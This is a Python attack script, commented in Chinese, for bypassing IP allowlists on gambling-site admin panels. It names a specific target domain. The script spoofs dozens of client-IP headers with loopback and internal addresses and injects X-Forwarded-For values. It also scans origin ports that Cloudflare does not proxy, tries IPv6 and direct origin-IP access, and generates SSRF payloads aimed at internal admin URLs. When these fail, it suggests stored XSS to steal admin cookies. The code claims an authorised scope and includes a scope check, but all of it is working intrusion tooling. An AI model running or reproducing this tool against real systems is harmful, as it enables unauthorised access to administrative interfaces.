#!/usr/bin/env python3
"""
ip_whitelist_bypass.py — IP 白名单全向量绕过探针（授权范围内）

博彩站管理后台常见防护模式：
  1. Cloudflare 代理 → Origin 检查 CF-Connecting-IP / X-Forwarded-For
  2. Nginx 反代 → 检查 X-Real-IP / X-Forwarded-For
  3. PHP/Node 中间件 → 检查 HTTP_CLIENT_IP / HTTP_X_FORWARDED_FOR 链
  4. 直接检查 REMOTE_ADDR（需要绕 CF 直连源站）
  5. 非标准端口 Admin（CF 只代理 80/443，2082/2086/8888 等直通源站）

绕过向量：
  A. IP Header 注入   — 30+ 个 IP 相关 Header，枚举所有写法
  B. X-Forwarded-For 首项注入  — CF 转发时拼接客户端 XFF 到前面
  C. 内网 IP 枚举     — 127.0.0.1 / 10.x / 172.x / 192.168.x
  D. 非标端口扫描     — CF 不代理的端口，Origin 直通
  E. IPv6 探测       — IPv4 白名单常不含 IPv6
  F. HTTP/1.0 探测   — 部分 WAF 降级处理不同
  G. 源站 IP 直连探测 — 结合 origin_recon 发现的 IP 直打

用法：
  # 全向量扫一个 admin URL
  python3 炼蛊房/ip_whitelist_bypass.py probe -u https://admin.target.com/admin

  # 只测试 Header 注入（最快）
  python3 炼蛊房/ip_whitelist_bypass.py headers -u https://target.com/admin/login

  # 非标端口扫描（绕 CF）
  python3 炼蛊房/ip_whitelist_bypass.py ports -d target.com

  # 指定自定义 IP 白名单候选（已知公司 IP 段）
  python3 炼蛊房/ip_whitelist_bypass.py headers -u https://target.com/admin \\
    --spoof-ips 1.2.3.4,10.0.0.1,192.168.1.1

  # 针对 wldzylbot 现有案卷的快速重测
  python3 炼蛊房/ip_whitelist_bypass.py probe \\
    -u https://www.wldzylbot.com/admin --out 案卷/wldzylbot_20260810/bypass/

依赖：pip install requests
"""

import argparse
import json
import socket
import sys
import time
from pathlib import Path
from urllib.parse import urlparse

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("[!] pip install requests", file=sys.stderr)
    sys.exit(1)

# ──────────────────────────── Scope 检查 ────────────────────────────

OPS = Path(__file__).resolve().parent
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))
from scope_lib import require_in_scope  # noqa: E402


# ──────────────────────────── IP 候选列表 ────────────────────────────

# 本地 / 回环
LOCAL_IPS = [
    "127.0.0.1", "127.0.0.2", "::1", "0.0.0.0",
    "localhost", "127.1", "0177.0.0.1",
    # URL 编码变体
    "0x7f000001",         # 127.0.0.1 的 hex
    "2130706433",         # 127.0.0.1 的十进制
]

# 内网 RFC1918
INTERNAL_IPS = [
    "10.0.0.1", "10.0.0.2", "10.1.1.1", "10.10.10.1",
    "172.16.0.1", "172.17.0.1", "172.18.0.1",
    "192.168.0.1", "192.168.1.1", "192.168.100.1",
]

# CF 源站常见"内部"IP 段（CF 到源站时有时 whitelist 了这些）
CF_ORIGIN_IPS = [
    "103.21.244.0", "103.22.200.0", "103.31.4.0",
    "104.16.0.1", "104.17.0.1", "104.18.0.1",
    "162.158.0.1", "172.64.0.1",
    "198.41.128.1", "198.41.192.1",
]

# 常见 CDN / 反代的内部 IP（Nginx upstream 自认为的内网）
PROXY_INTERNAL_IPS = [
    "10.0.0.0", "10.255.255.255",
    "172.31.255.255",
    "192.168.0.0",
    "100.64.0.1",   # CGNAT
]

# 中国大陆常见 VPN/出口 IP（博彩站运营方常用）
CN_COMMON_EXITS = [
    "223.104.0.1", "218.4.0.1", "117.50.1.1",
    "113.108.0.1", "119.29.0.1",
]


# ──────────────────────────── Header 矩阵 ───────────────────────────

# 所有可能被服务器端用于获取客户端 IP 的 Header
IP_HEADERS = [
    "X-Forwarded-For",
    "X-Real-IP",
    "X-Client-IP",
    "Client-IP",
    "True-Client-IP",
    "CF-Connecting-IP",
    "X-Originating-IP",
    "X-Remote-IP",
    "X-Remote-Addr",
    "X-Host",
    "X-Forwarded-Host",
    "Forwarded",
    "X-Original-Forwarded-For",
    "X-Cluster-Client-IP",
    "X-ProxyUser-Ip",
    "Via",
    "Forwarded-For",
    "X-Coming-From",
    "X-Gateway-IP",
    "X-Api-Real-IP",
    "HTTP_X_FORWARDED_FOR",
    "HTTP_CLIENT_IP",
    "HTTP_X_REAL_IP",
    "HTTP_X_FORWARDED",
    "HTTP_FORWARDED_FOR",
    "HTTP_VIA",
    "HTTP_X_CLUSTER_CLIENT_IP",
    "HTTP_CF_CONNECTING_IP",
    # 阿里云 SLB / 腾讯云 CLB
    "Ali-CDN-Real-IP",
    "X-Ali-Real-IP",
    "CDN-Src-IP",
    "X-Cdn-Src-Ip",
    "X-CLB-IP",
    # 其他自定义
    "X-Intranet-IP",
    "X-Internal-IP",
    "Proxy-Client-IP",
    "WL-Proxy-Client-IP",
    "PROXY_REMOTE_ADDR",
    "Fastly-Client-IP",
    "X-Azure-ClientIP",
]

# 非标准端口（CF 默认不代理 → 直通源站）
# 参考：https://developers.cloudflare.com/fundamentals/reference/network-ports/
NON_CF_PORTS = [
    2052, 2053, 2082, 2083, 2086, 2087, 2095, 2096,
    8443, 8080, 8880, 8888, 8000, 8001, 9000, 9001,
    3000, 4000, 5000, 6000, 7000,
    81, 82, 88, 9080, 9443,
    # 博彩站特有
    7001, 7002, 8880, 9999, 10000,
]

# 管理路径候选（快速探测）
ADMIN_PATHS = [
    "/admin", "/admin/", "/admin/login", "/admin/index",
    "/manage", "/management", "/backend", "/dashboard",
    "/api/admin", "/api/v1/admin",
    "/system/login", "/system/admin",
    "/manager", "/console",
    "/operator", "/oper/login",
]


# ──────────────────────────── HTTP 工具 ─────────────────────────────

def _sess(extra_headers: dict = None) -> requests.Session:
    s = requests.Session()
    s.verify = False
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Accept": "text/html,application/json,*/*",
    })
    if extra_headers:
        s.headers.update(extra_headers)
    return s


def _get(sess, url: str, extra_headers: dict = None, **kw) -> requests.Response | None:
    try:
        kw.setdefault("timeout", 10)
        kw.setdefault("verify", False)
        kw.setdefault("allow_redirects", False)
        if extra_headers:
            return sess.get(url, headers=extra_headers, **kw)
        return sess.get(url, **kw)
    except Exception:
        return None


def _baseline(url: str) -> tuple[int, str] | None:
    """不带任何 IP Header 的基准请求"""
    sess = _sess()
    r = _get(sess, url)
    if r:
        return r.status_code, r.text[:500]
    return None


def _is_blocked(status: int, body: str, baseline_status: int) -> bool:
    """判断是否被 IP 白名单拦截"""
    # 403/401/302 重定向到 login 通常是正常的权限拦截，不是 IP 白名单
    # 520/521/522/523/524 是 CF 错误
    # 典型 IP 白名单响应：403 + "IP not allowed" / "Access denied" / "Your IP"
    ip_block_keywords = [
        "ip not allowed", "access denied", "ip address not allowed",
        "forbidden", "ip被禁止", "ip限制", "访问受限", "not allowed",
        "白名单", "whitelist", "your ip", "blocked",
        "ip not in whitelist", "非法ip", "unauthorized ip",
    ]
    body_lower = body.lower()
    if any(kw in body_lower for kw in ip_block_keywords):
        return True
    if status in (520, 521, 522, 523, 524):
        return True
    return False


def _is_bypassed(status: int, body: str, baseline_status: int) -> bool:
    """判断是否绕过了拦截（比较基准）"""
    # 状态码从拦截类变为成功类
    if status in (200, 302, 301) and baseline_status in (403, 520, 521, 400, 503):
        return True
    # 200 且包含登录页特征（原基准非 200，说明确实打开了新页面）
    # 注意：必须限制 status==200，避免 403 页面含 "login" 关键词导致误报
    if status == 200 and baseline_status not in (200, 301, 302):
        login_kw = ["login", "username", "password", "用户名", "密码", "登录", "sign in"]
        body_lower = body.lower()
        if any(kw in body_lower for kw in login_kw):
            return True
    return False


# ──────────────────────────── Header 注入测试 ────────────────────────

def test_header_injection(url: str, spoof_ips: list[str] = None,
                           baseline: tuple = None) -> list[dict]:
    """
    枚举所有 IP Header × IP 候选，找能绕过的组合

    CF 的 X-Forwarded-For 行为：
      CF 会在 XFF 末尾追加真实客户端 IP。
      如果你发送 X-Forwarded-For: 127.0.0.1，
      到达 origin 的是 X-Forwarded-For: 127.0.0.1, <你的真实IP>
      若应用取第一个 IP 来检查 whitelist → 绕过！
    """
    if spoof_ips is None:
        spoof_ips = LOCAL_IPS[:3] + INTERNAL_IPS[:4]

    baseline_status = baseline[0] if baseline else 403
    hits = []

    sess = _sess()
    base_r = _get(sess, url)
    if base_r:
        baseline_status = base_r.status_code
        baseline_body = base_r.text[:500]
    else:
        baseline_body = ""

    print(f"  基准: HTTP {baseline_status}  ({url})")
    print(f"  测试 {len(IP_HEADERS)} 个 Header × {len(spoof_ips)} 个 IP = "
          f"{len(IP_HEADERS) * len(spoof_ips)} 个组合...")

    for header in IP_HEADERS:
        for ip in spoof_ips:
            # 构造 Forwarded 标准格式
            if header == "Forwarded":
                value = f"for={ip};proto=https"
            elif header == "Via":
                value = f"1.1 {ip}"
            else:
                value = ip

            r = _get(sess, url, extra_headers={header: value})
            if not r:
                continue

            body = r.text[:500]
            status = r.status_code

            if _is_bypassed(status, body, baseline_status):
                hit = {
                    "header": header,
                    "value": value,
                    "status": status,
                    "body_snippet": body[:150],
                    "bypass": True,
                }
                hits.append(hit)
                print(f"\n  ★★ BYPASS!  {header}: {value}  → HTTP {status}")
                print(f"       响应: {body[:100]}")

            time.sleep(0.05)  # 避免速率限制

    return hits


# ──────────────────────────── X-Forwarded-For 首项注入 ───────────────

def test_xff_first_item(url: str, spoof_ips: list[str] = None) -> list[dict]:
    """
    专门测试 XFF 首项注入：
    X-Forwarded-For: 127.0.0.1
    → CF 转发后变为: X-Forwarded-For: 127.0.0.1, <real-ip>
    → 应用取第一项 = 127.0.0.1 → 绕过
    """
    if spoof_ips is None:
        spoof_ips = LOCAL_IPS + INTERNAL_IPS

    hits = []
    sess = _sess()

    # 基准
    base_r = _get(sess, url)
    baseline_status = base_r.status_code if base_r else 403
    baseline_body = base_r.text[:500] if base_r else ""

    for ip in spoof_ips:
        # 仅设置 XFF（CF 会在后面追加真实 IP）
        headers_combo = {"X-Forwarded-For": ip}
        r = _get(sess, url, extra_headers=headers_combo)
        if not r:
            continue
        if _is_bypassed(r.status_code, r.text[:500], baseline_status):
            hits.append({
                "header": "X-Forwarded-For",
                "value": ip,
                "status": r.status_code,
                "note": "XFF 首项注入",
                "body_snippet": r.text[:150],
            })
            print(f"  ★ XFF 首项: {ip} → HTTP {r.status_code}")
        time.sleep(0.05)

    # 多值 XFF（有些应用取 last，有些取 first）
    for ip in spoof_ips[:5]:
        xff_multi = f"{ip}, 192.0.2.1"
        r = _get(sess, url, extra_headers={"X-Forwarded-For": xff_multi})
        if not r:
            continue
        if _is_bypassed(r.status_code, r.text[:500], baseline_status):
            hits.append({
                "header": "X-Forwarded-For",
                "value": xff_multi,
                "status": r.status_code,
                "note": "XFF 多值（首项）",
                "body_snippet": r.text[:150],
            })

    return hits


# ──────────────────────────── HTTP/1.0 & 协议降级 ───────────────────

def test_protocol_bypass(url: str) -> list[dict]:
    """
    HTTP/1.0 部分 WAF/CF 处理不同
    无 Host header 有时绕过反代白名单检查
    """
    hits = []
    parsed = urlparse(url)
    host = parsed.netloc
    path = parsed.path or "/"
    port = parsed.port or (443 if parsed.scheme == "https" else 80)

    # 尝试通过 requests 发送 HTTP/1.0 风格请求
    # （requests 默认 HTTP/1.1，但服务器可能处理不同）
    sess = _sess()

    # 无 Host header
    r = _get(sess, url, extra_headers={"Host": ""})
    if r and _is_bypassed(r.status_code, r.text[:500], 403):
        hits.append({"method": "no_host_header", "status": r.status_code})

    # IP:port 直访（如果知道源站 IP）
    # 这里只生成命令模板
    return hits


# ──────────────────────────── 非标端口扫描 ──────────────────────────

def test_non_cf_ports(domain: str, paths: list[str] = None,
                       timeout: int = 4) -> list[dict]:
    """
    Cloudflare 默认只代理指定端口，其余端口直通源站。
    在非标准端口上，Nginx/Apache 可能没有 IP 白名单配置。
    """
    if paths is None:
        paths = ADMIN_PATHS[:5]

    hits = []
    sess = _sess()

    print(f"\n  扫描 {domain} 的非标准端口（CF 不代理）...")

    for port in NON_CF_PORTS:
        # 先用 socket 检查端口是否开放
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((domain, port))
            sock.close()
            if result != 0:
                continue
        except Exception:
            continue

        scheme = "https" if port in (443, 2083, 2087, 2096, 8443, 9443) else "http"
        base_url = f"{scheme}://{domain}:{port}"

        # 尝试访问 admin 路径
        for path in paths:
            url = base_url + path
            r = _get(sess, url)
            if not r:
                continue
            if r.status_code not in (404, 502, 503):
                body = r.text[:300]
                hit = {
                    "port": port,
                    "url": url,
                    "status": r.status_code,
                    "body_snippet": body[:100],
                    "is_admin": any(kw in body.lower() for kw in
                                    ["login", "admin", "username", "password", "管理"]),
                }
                hits.append(hit)
                mark = "★★" if hit["is_admin"] else "+"
                print(f"  [{mark}] 端口 {port}  {url}  HTTP {r.status_code}")
                if hit["is_admin"]:
                    print("       → 可能是 Admin 登录页！")
            time.sleep(0.1)

    return hits


# ──────────────────────────── IPv6 探测 ─────────────────────────────

def test_ipv6(domain: str, path: str = "/admin") -> list[dict]:
    """IPv4 白名单常不含 IPv6，试 AAAA 记录直连"""
    hits = []
    try:
        # 解析 AAAA 记录
        infos = socket.getaddrinfo(domain, 443, socket.AF_INET6)
        if infos:
            ipv6_addr = infos[0][4][0]
            print(f"  IPv6 地址: {ipv6_addr}")
            url = f"https://[{ipv6_addr}]{path}"
            sess = _sess({"Host": domain})
            r = _get(sess, url)
            if r and r.status_code not in (520, 521, 522):
                hits.append({
                    "ipv6": ipv6_addr,
                    "status": r.status_code,
                    "note": f"IPv6 直连 {url}",
                })
                print(f"  [+] IPv6 可达: HTTP {r.status_code}")
    except Exception as e:
        print(f"  IPv6 解析失败: {e}")
    return hits


# ──────────────────────────── 源站直连探测 ──────────────────────────

def test_origin_direct(domain: str, path: str = "/admin",
                        origin_ips: list[str] = None) -> list[dict]:
    """
    对已知源站 IP 直接请求（绕过 CF + IP 白名单可能失效）
    配合 origin_recon.py 使用
    """
    if not origin_ips:
        print("  [!] 未指定源站 IP，请先运行: python3 炼蛊房/origin_recon.py -d <domain>")
        return []

    hits = []
    for ip in origin_ips:
        for port in [80, 443, 8080, 8443]:
            scheme = "https" if port in (443, 8443) else "http"
            url = f"{scheme}://{ip}{path}"
            sess = _sess({"Host": domain})
            r = _get(sess, url)
            if not r:
                continue
            if r.status_code not in (520, 521, 522, 503, 502):
                body = r.text[:300]
                is_admin = any(kw in body.lower() for kw in
                               ["login", "admin", "username", "password"])
                hits.append({
                    "origin_ip": ip,
                    "port": port,
                    "url": url,
                    "status": r.status_code,
                    "is_admin": is_admin,
                })
                mark = "★★" if is_admin else "+"
                print(f"  [{mark}] 源站直连 {ip}:{port}  HTTP {r.status_code}"
                      + (" → Admin面！" if is_admin else ""))
            time.sleep(0.2)

    return hits


# ──────────────────────────── SSRF 内部转发 ─────────────────────────

def gen_ssrf_admin_payloads(admin_path: str = "/admin/login",
                             target_domain: str = "target.com") -> list[str]:
    """
    生成用于 SSRF 的管理后台内网访问 payload
    如果有 SSRF 点，可以让服务器替我们访问内部 admin（绕过 IP 白名单）
    """
    payloads = []
    for ip in ["127.0.0.1", "localhost", "0.0.0.0", "10.0.0.1"]:
        for port in [80, 8080, 8888, 8000, 443]:
            payloads.append(f"http://{ip}:{port}{admin_path}")
            payloads.append(f"https://{ip}:{port}{admin_path}")

    # DNS Rebinding 辅助（指向 127.0.0.1 的域名）
    payloads.append(f"http://localtest.me{admin_path}")
    payloads.append(f"http://customer1.app.localhost.my.company{admin_path}")

    return payloads


# ──────────────────────────── 综合探测 ──────────────────────────────

def probe_all(url: str, domain: str = "", spoof_ips: list[str] = None,
              origin_ips: list[str] = None, out_dir: Path = None) -> dict:
    """全向量综合探测"""
    parsed = urlparse(url)
    host = parsed.netloc.split(":")[0]
    domain = domain or host

    print(f"\n{'='*65}")
    print("  IP 白名单绕过全向量探测")
    print(f"  目标: {url}")
    print(f"{'='*65}")

    results = {
        "target": url,
        "domain": domain,
        "header_bypass": [],
        "xff_bypass": [],
        "port_bypass": [],
        "ipv6_bypass": [],
        "protocol_bypass": [],
        "origin_direct": [],
        "ssrf_payloads": [],
        "summary": [],
    }

    # ── A. Header 注入
    print(f"\n[A] IP Header 注入测试 ({len(IP_HEADERS)} 个 Header)...")
    results["header_bypass"] = test_header_injection(url, spoof_ips)

    # ── B. XFF 首项注入
    print("\n[B] X-Forwarded-For 首项注入测试...")
    results["xff_bypass"] = test_xff_first_item(url, spoof_ips)

    # ── C. 非标端口
    print("\n[C] 非标端口扫描（CF 不代理端口）...")
    results["port_bypass"] = test_non_cf_ports(domain)

    # ── D. IPv6
    print("\n[D] IPv6 探测...")
    results["ipv6_bypass"] = test_ipv6(domain, parsed.path or "/admin")

    # ── E. 源站直连
    if origin_ips:
        print(f"\n[E] 源站 IP 直连测试 ({len(origin_ips)} 个 IP)...")
        results["origin_direct"] = test_origin_direct(
            domain, parsed.path or "/admin", origin_ips)
    else:
        print("\n[E] 源站直连: 跳过（使用 --origin-ips 指定源站 IP）")
        print(f"    先运行: python3 炼蛊房/origin_recon.py -d {domain}")

    # ── F. 协议降级（HTTP/1.0 / 去 Host header）
    print("\n[F] 协议降级测试（HTTP/1.0 / 无 Host header）...")
    proto_hits = test_protocol_bypass(url)
    results["protocol_bypass"] = proto_hits
    if proto_hits:
        for p in proto_hits:
            print(f"  ★★ 协议绕过: {p.get('method')}  HTTP {p.get('status')}")

    # ── G. SSRF payloads
    results["ssrf_payloads"] = gen_ssrf_admin_payloads(parsed.path or "/admin/login", domain)

    # ── 汇总
    all_hits = (results["header_bypass"] + results["xff_bypass"] +
                results["port_bypass"] + results["ipv6_bypass"] +
                results["protocol_bypass"] + results["origin_direct"])
    total = len(all_hits)

    print(f"\n{'='*65}")
    print(f"  汇总结果: 发现 {total} 个绕过路径")
    if results["header_bypass"] or results["xff_bypass"]:
        print("\n  ★★ Header 注入绕过:")
        for h in results["header_bypass"] + results["xff_bypass"]:
            print(f"     {h['header']}: {h['value']}  → HTTP {h['status']}")
            print(f"       curl -sk -H '{h['header']}: {h['value']}' '{url}'")
    if results["port_bypass"]:
        print("\n  ★★ 非标端口管理面:")
        for p in results["port_bypass"]:
            if p.get("is_admin"):
                print(f"     {p['url']}  HTTP {p['status']}")
    if results["origin_direct"]:
        print("\n  ★★ 源站直连绕过:")
        for o in results["origin_direct"]:
            if o.get("is_admin"):
                print(f"     {o['url']}  HTTP {o['status']}")
    if results["ssrf_payloads"]:
        print("\n  SSRF 内网 Admin payload 示例:")
        for p in results["ssrf_payloads"][:3]:
            print(f"     {p}")
        print(f"     （共 {len(results['ssrf_payloads'])} 个，详见输出文件）")

    if not all_hits:
        print("\n  [-] 自动探测未发现直接绕过路径")
        print("\n  下一步建议:")
        print("  1. 通过 SSRF 让服务器内部访问 Admin（见 ssrf_payloads）")
        print("  2. 存储型 XSS → 获取 Admin Cookie")
        print("  3. 获取公司 VPN/出口 IP → 配合住宅代理池匹配")
        print("  4. 从 heapdump/env 泄露 → 找白名单 IP 段")
        print("  5. 搜索 Shodan/FOFA 找直接暴露的 Admin（非 CF 代理）")

    if out_dir:
        out_dir.mkdir(parents=True, exist_ok=True)
        out_f = out_dir / "ip_whitelist_bypass_result.json"
        out_f.write_text(json.dumps(results, ensure_ascii=False, indent=2))
        print(f"\n  [+] 结果已保存: {out_f}")

    return results


# ──────────────────────────── 命令入口 ──────────────────────────────

def cmd_probe(args: argparse.Namespace) -> int:
    url = args.url.rstrip("/")
    host = urlparse(url).netloc.split(":")[0]
    require_in_scope(host)

    spoof_ips = None
    if args.spoof_ips:
        spoof_ips = [ip.strip() for ip in args.spoof_ips.split(",")]
    origin_ips = None
    if args.origin_ips:
        origin_ips = [ip.strip() for ip in args.origin_ips.split(",")]
    out_dir = Path(args.out) if args.out else None

    probe_all(url, args.domain or host, spoof_ips, origin_ips, out_dir)
    return 0


def cmd_headers(args: argparse.Namespace) -> int:
    url = args.url.rstrip("/")
    host = urlparse(url).netloc.split(":")[0]
    require_in_scope(host)

    spoof_ips = None
    if args.spoof_ips:
        spoof_ips = [ip.strip() for ip in args.spoof_ips.split(",")]
    else:
        spoof_ips = LOCAL_IPS + INTERNAL_IPS

    print(f"\n[*] IP Header 注入测试: {url}")
    hits = test_header_injection(url, spoof_ips)

    if hits:
        print(f"\n★★ 发现 {len(hits)} 个有效绕过！")
        for h in hits:
            print(f"\n  curl -sk -H '{h['header']}: {h['value']}' '{url}'")
    else:
        print("\n[-] 未发现 Header 注入绕过")
    return 0


def cmd_ports(args: argparse.Namespace) -> int:
    domain = args.domain
    host = domain.split("/")[-1]
    require_in_scope(host)

    print(f"\n[*] 非标端口扫描: {domain}")
    hits = test_non_cf_ports(domain)

    print(f"\n[*] 发现 {len(hits)} 个开放端口响应")
    admin_hits = [h for h in hits if h.get("is_admin")]
    if admin_hits:
        print(f"★★ 其中 {len(admin_hits)} 个疑似 Admin 面:")
        for h in admin_hits:
            print(f"   {h['url']}  HTTP {h['status']}")
    return 0


def cmd_ssrf(args: argparse.Namespace) -> int:
    """生成用于 SSRF 的 Admin 内网访问 payload 列表"""
    payloads = gen_ssrf_admin_payloads(args.path, args.domain)
    for p in payloads:
        print(p)
    return 0


def main():
    ap = argparse.ArgumentParser(
        description="ip_whitelist_bypass — IP 白名单全向量绕过探针（授权范围内）"
    )
    sub = ap.add_subparsers(dest="cmd", required=True)

    p = sub.add_parser("probe", help="全向量综合探测（Header + 端口 + IPv6 + 源站直连）")
    p.add_argument("-u", "--url", required=True, help="目标 Admin URL")
    p.add_argument("-d", "--domain", default="", help="根域名（用于端口扫描/IPv6）")
    p.add_argument("--spoof-ips", default="", help="自定义欺骗 IP（逗号分隔）")
    p.add_argument("--origin-ips", default="", help="已知源站 IP（逗号分隔）")
    p.add_argument("--out", default="", help="输出目录")

    p = sub.add_parser("headers", help="只测试 IP Header 注入（速度最快）")
    p.add_argument("-u", "--url", required=True)
    p.add_argument("--spoof-ips", default="", help="自定义 IP（逗号分隔，默认本地+内网）")

    p = sub.add_parser("ports", help="非标准端口扫描（CF 不代理 → 直通源站）")
    p.add_argument("-d", "--domain", required=True, help="目标域名")
    p.add_argument("--paths", default="", help="admin 路径（逗号分隔）")

    p = sub.add_parser("ssrf", help="生成 SSRF → Admin 内网访问 payload")
    p.add_argument("-d", "--domain", required=True)
    p.add_argument("--path", default="/admin/login", help="Admin 路径")

    args = ap.parse_args()
    fn = {
        "probe": cmd_probe,
        "headers": cmd_headers,
        "ports": cmd_ports,
        "ssrf": cmd_ssrf,
    }[args.cmd]
    sys.exit(fn(args))


if __name__ == "__main__":
    main()
